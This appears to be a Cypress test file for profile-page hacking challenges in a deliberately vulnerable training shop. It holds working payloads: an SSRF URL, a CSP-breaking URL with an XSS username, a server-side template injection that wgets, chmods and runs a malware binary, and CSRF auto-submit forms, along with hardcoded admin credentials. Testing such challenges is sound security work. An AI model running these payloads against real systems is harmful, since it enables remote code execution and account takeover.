describe('/profile', () => {
  beforeEach(() => {
    cy.login({ email: 'admin', password: 'admin123' })
  })
  describe('challenge "ssrf"', () => {
    it('should be possible to request internal resources using image upload URL', () => {
      cy.visit('/profile')

      cy.get('#url').type(
        `${Cypress.config('baseUrl')}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3`
      )
      cy.get('#submitUrl').click()
      cy.visit('/')
      cy.expectChallengeSolved({ challenge: 'SSRF' })
    })
  })

  describe('challenge "usernameXss"', () => {
    // Regression test: a CSP-breaking profile image URL is now rejected
    // (see routes/profileImageUrlUpload.ts) and the username is always
    // sanitized (see models/user.ts), so CSP can no longer be weakened
    // and this challenge can never be solved.
    it('should reject a CSP-breaking profile image URL and sanitize the username', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.visit('/profile')
          cy.get('#url').type(
            "https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval'"
          )
          cy.get('#submitUrl').click()
          cy.get('#username').type('<<a|ascript>alert(`xss`)</script>')
          cy.get('#submit').click()

          cy.get('#username').clear()
          cy.get('#username').type('αδмιη')
          cy.get('#submit').click()

          cy.get('#url').type(
            `${Cypress.config('baseUrl')}/assets/public/images/uploads/default.svg`
          )
          cy.get('#submitUrl').click()
          cy.visit('/#/')

          cy.request({
            method: 'GET',
            url: '/api/Challenges/?name=CSP Bypass',
            timeout: 60000
          }).then((res) => {
            const challenge = res.body.data[0]
            // eslint-disable-next-line @typescript-eslint/no-unused-expressions
            expect(challenge.solved).to.be.false
          })
        }
      })
    })
  })

  describe('challenge "ssti"', () => {
    it('should be possible to inject arbitrary nodeJs commands in username', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.visit('/profile')
          cy.get('#username').type(
            "#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}",
            { parseSpecialCharSequences: false }
          )
          cy.get('#submit').click()
          cy.request(
            '/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3'
          )
          cy.visit('/')
          // void browser.driver.sleep(10000);
          // void browser.waitForAngularEnabled(true);
          cy.expectChallengeSolved({ challenge: 'SSTi' })
        }
      })
    })
  })

  describe('challenge "csrf"', () => {
    // FIXME Only works on Chrome <80 but Protractor uses latest Chrome version. Test can probably never be turned on again.
    xit('should be possible to perform a CSRF attack against the user profile page', () => {
      cy.visit('http://htmledit.squarefree.com')
      /* The script executed below is equivalent to pasting this string into http://htmledit.squarefree.com: */
      /* <form action="http://localhost:3000/profile" method="POST"><input type="hidden" name="username" value="CSRF"/><input type="submit"/></form><script>document.forms[0].submit();</script> */
      let document: any
      cy.window().then(() => {
        document
          .getElementsByName('editbox')[0]
          .contentDocument.getElementsByName(
            'ta'
          )[0].value = `<form action=\\"${Cypress.config('baseUrl')}/profile\\" 
        method=\\"POST\\">
        <input type=\\"hidden\\" name=\\"username\\" value=\\"CSRF\\"/>
        <input type=\\"submit\\"/>
        </form>
        <script>document.forms[0].submit();
        </script>
        `
      })
      // cy.expectChallengeSolved({ challenge: 'CSRF' })
    })

    xit('should be possible to fake a CSRF attack against the user profile page', () => {
      cy.visit('/')
      cy.window().then(async () => {
        const formData = new FormData()
        formData.append('username', 'CSRF')

        const response = await fetch(`${Cypress.config('baseUrl')}/profile`, {
          method: 'POST',
          cache: 'no-cache',
          headers: {
            'Content-type': 'application/x-www-form-urlencoded',
            Authorization: `Bearer ${localStorage.getItem('token')}`,
            Origin: 'http://htmledit.squarefree.com', // FIXME Not allowed by browser due to "unsafe header not permitted"
            Cookie: `token=${localStorage.getItem('token')}` // FIXME Not allowed by browser due to "unsafe header not permitted"
          },
          body: formData
        })
        if (response.status === 200) {
          console.log('Success')
        }
      })
      // cy.expectChallengeSolved({ challenge: 'CSRF' })
    })
  })
})
